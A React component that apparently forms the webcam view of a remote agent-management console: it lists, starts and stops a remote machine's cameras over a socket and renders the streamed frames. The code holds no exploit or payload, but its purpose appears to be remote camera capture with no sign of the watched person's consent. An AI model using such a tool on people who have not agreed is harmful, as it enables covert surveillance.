import { useState, useRef, useEffect, useCallback } from "react";
import { send } from "../../socket";
import { on, off } from "../../socket/events";
import { FullscreenIcon, ExitFullscreenIcon } from "../icons/FullscreenIcon";

export default function Webcam({ agent }) {
  const agentId = String(agent.id);
  const canvasRef = useRef(null);
  const containerRef = useRef(null);
  const imgRef = useRef(null);
  const [fps, setFps] = useState(0);
  const [res, setRes] = useState({ w: 0, h: 0 });
  const [camOn, setCamOn] = useState(false);
  const [devices, setDevices] = useState([]);
  const [device, setDevice] = useState(0);
  const [requested, setRequested] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [stale, setStale] = useState(false);
  const lastFrame = useRef(0);
  const fc = useRef(0);
  const camOnRef = useRef(false);
  const staleRef = useRef(false);

  const drawFrame = useCallback(async (blob) => {
    const c = canvasRef.current;
    if (!c) return;
    try {
      const bmp = await createImageBitmap(blob);
      if (imgRef.current) imgRef.current.close();
      imgRef.current = bmp;
      lastFrame.current = Date.now();
      fc.current++;
      if (staleRef.current) { staleRef.current = false; setStale(false); }
      if (c.width !== bmp.width || c.height !== bmp.height) {
        c.width = bmp.width;
        c.height = bmp.height;
        setRes({ w: bmp.width, h: bmp.height });
      }
      const ctx = c.getContext("2d");
      ctx.imageSmoothingEnabled = true;
      ctx.imageSmoothingQuality = "high";
      ctx.drawImage(bmp, 0, 0);
    } catch (_) {}
  }, []);

  useEffect(() => {
    window.__wsCamHandler = drawFrame;
    const unCamDevices = on("cam_devices", (p) => {
      if (!p || String(p.agent_id) !== agentId) return;
      const list = Array.isArray(p.devices) ? p.devices : [];
      if (list.length === 0) return;
      setDevices(list);
      setDevice(list[0].id);
    });

    const t1 = setInterval(() => {
      if (lastFrame.current > 0 && Date.now() - lastFrame.current > 3000) {
        if (!staleRef.current) { staleRef.current = true; setStale(true); setFps(0); }
      }
    }, 500);
    const t2 = setInterval(() => { setFps(fc.current); fc.current = 0; }, 1000);

    return () => {
      window.__wsCamHandler = null;
      off("cam_devices", unCamDevices);
      clearInterval(t1);
      clearInterval(t2);
      if (camOnRef.current) send("cam_stop", { agent_id: agentId });
      if (imgRef.current) { imgRef.current.close(); imgRef.current = null; }
    };
  }, [agentId, drawFrame]);

  const startCam = useCallback((deviceID) => {
    send("cam_start", { agent_id: agentId, device_id: deviceID });
    camOnRef.current = true;
    setCamOn(true);
  }, [agentId]);

  const stopCam = useCallback(() => {
    send("cam_stop", { agent_id: agentId });
    camOnRef.current = false;
    setCamOn(false);
  }, [agentId]);

  const toggleCam = useCallback(() => {
    if (camOnRef.current) { stopCam(); return; }
    if (devices.length > 0) { startCam(device); return; }
    setRequested(true);
    send("cam_list", { agent_id: agentId });
  }, [agentId, device, devices, startCam, stopCam]);

  useEffect(() => {
    if (requested && devices.length > 0 && !camOnRef.current) {
      startCam(devices[0].id);
    }
  }, [requested, devices, startCam]);

  const toggleFullscreen = useCallback(() => {
    const el = containerRef.current;
    if (!el) return;
    if (!document.fullscreenElement) {
      el.requestFullscreen?.();
    } else {
      document.exitFullscreen?.();
    }
  }, []);

  useEffect(() => {
    const onChange = () => setIsFullscreen(!!document.fullscreenElement);
    document.addEventListener("fullscreenchange", onChange);
    return () => document.removeEventListener("fullscreenchange", onChange);
  }, []);

  const MONO = "ui-monospace, 'Cascadia Mono', monospace";
  const M = "var(--window-face)";
  const MHI = "color-mix(in srgb, var(--text) 12%, transparent)";
  const MT = "var(--text)";
  const MM = "var(--muted)";

  return (
    <div ref={containerRef} className="h-full flex flex-col outline-none" style={{ background: "#0a0a0a", position: "relative" }}>
      {!isFullscreen && (
        <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 8px", height: 32, flexShrink: 0, background: M, borderBottom: `1px solid ${MHI}` }}>
          <span style={{ fontFamily: MONO, fontSize: 11, color: stale ? "#e87070" : "#4ade80", background: stale ? "rgba(220,50,50,0.12)" : "rgba(0,0,0,0.3)", border: `1px solid ${stale ? "rgba(220,50,50,0.3)" : "rgba(255,255,255,0.06)"}`, padding: "1px 8px", borderRadius: 3 }}>
            {stale ? "no signal" : camOn ? `${fps} fps` : "off"}
          </span>
          {res.w > 0 && (
            <span style={{ fontFamily: MONO, fontSize: 11, color: MM, background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,255,255,0.06)", padding: "1px 8px", borderRadius: 3 }}>
              {res.w}×{res.h}
            </span>
          )}
          <div style={{ flex: 1 }} />
          <button onClick={toggleFullscreen} title="Fullscreen" style={{ background: "transparent", border: "none", cursor: "pointer", color: MM, padding: "4px", borderRadius: 3, display: "flex", alignItems: "center" }}>
            <FullscreenIcon className="w-4 h-4" />
          </button>
        </div>
      )}

      <div style={{ flex: 1, minHeight: 0, position: "relative", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <canvas ref={canvasRef} style={{ maxWidth: "100%", maxHeight: "100%", objectFit: "contain" }} />
        {!camOn && (
          <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", color: MM, fontFamily: MONO, fontSize: 12, pointerEvents: "none" }}>
            click start to begin capture
          </div>
        )}
      </div>

      {!isFullscreen && (
        <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "0 12px", height: 40, flexShrink: 0, background: M, borderTop: `1px solid ${MHI}` }}>
          <button onClick={toggleCam} style={{ display: "flex", alignItems: "center", gap: 6, background: camOn ? "rgba(220,50,50,0.15)" : "transparent", border: `1px solid ${camOn ? "rgba(220,50,50,0.4)" : MHI}`, borderRadius: 4, cursor: "pointer", padding: "4px 10px" }}>
            <span style={{ width: 7, height: 7, borderRadius: "50%", background: camOn ? "#dc3545" : "#666", boxShadow: camOn ? "0 0 6px #dc3545" : "none", flexShrink: 0 }} />
            <span style={{ fontFamily: MONO, fontSize: 11, color: camOn ? "#dc3545" : MT }}>
              {camOn ? "Stop" : "Start"}
            </span>
          </button>
          {requested && devices.length === 0 && (
            <span style={{ fontFamily: MONO, fontSize: 10, color: MM }}>No cameras found</span>
          )}
          {devices.length > 0 && (
            <select value={device} onChange={(e) => { const id = parseInt(e.target.value); setDevice(id); if (camOnRef.current) { stopCam(); setTimeout(() => startCam(id), 100); } }} style={{ fontSize: 11, fontFamily: MONO, background: "rgba(0,0,0,0.3)", color: MT, border: `1px solid ${MHI}`, padding: "3px 6px", borderRadius: 3, cursor: "pointer", maxWidth: 200 }}>
              {devices.map((d) => <option key={d.id} value={d.id}>{d.name}</option>)}
            </select>
          )}
        </div>
      )}

      {isFullscreen && (
        <button onClick={toggleFullscreen} title="Exit fullscreen" style={{ position: "absolute", top: 8, right: 8, zIndex: 30, background: "rgba(0,0,0,0.6)", border: "1px solid rgba(255,255,255,0.1)", cursor: "pointer", color: "#fff", padding: "6px", borderRadius: 4, display: "flex", alignItems: "center", opacity: 0.5 }}>
          <ExitFullscreenIcon className="w-4 h-4" />
        </button>
      )}
    </div>
  );
}